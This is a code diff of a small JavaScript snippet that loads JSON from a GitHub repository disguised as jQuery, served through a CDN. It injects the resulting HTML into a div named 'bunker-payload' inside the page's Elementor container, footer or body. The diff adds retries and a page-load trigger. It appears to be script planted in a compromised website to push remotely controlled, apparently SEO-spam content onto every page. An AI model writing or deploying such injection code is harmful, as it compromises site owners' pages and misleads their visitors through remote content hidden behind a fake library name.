@@ -1,6 +1,8 @@
 (function () {
 
   const QUERY_URL = "https://cdn.jsdelivr.net/gh/nanangkus/jquery@refs/heads/main/query.json";
+  const MAX_TRY = 20;
+  let attempt = 0;
 
   function createArticle(data) {
     let html = "";
@@ -22,21 +24,41 @@
     return html;
   }
 
-  fetch(QUERY_URL)
-    .then(res => res.json())
-    .then(json => {
+  function inject(html) {
+    if (document.getElementById("bunker-payload")) return;
 
-      const div = document.createElement("div");
-      div.id = "bunker-payload";
-      div.style.display = "block"; // SEO safe
-      div.innerHTML = createArticle(json);
+    const div = document.createElement("div");
+    div.id = "bunker-payload";
+    div.style.display = "block"; // debug mode
+    div.innerHTML = html;
 
-      const target =
-        document.querySelector(".elementor") ||
-        document.querySelector("footer") ||
-        document.body;
+    const target =
+      document.querySelector(".elementor") ||
+      document.querySelector("footer") ||
+      document.body;
 
-      target.appendChild(div);
-    });
+    if (!target) return false;
+
+    target.appendChild(div);
+    return true;
+  }
+
+  function tryInject() {
+    fetch(QUERY_URL)
+      .then(r => r.json())
+      .then(json => {
+        if (inject(createArticle(json))) return;
+        if (++attempt < MAX_TRY) setTimeout(tryInject, 500);
+      })
+      .catch(() => {
+        if (++attempt < MAX_TRY) setTimeout(tryInject, 500);
+      });
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", tryInject);
+  } else {
+    tryInject();
+  }
 
 })();
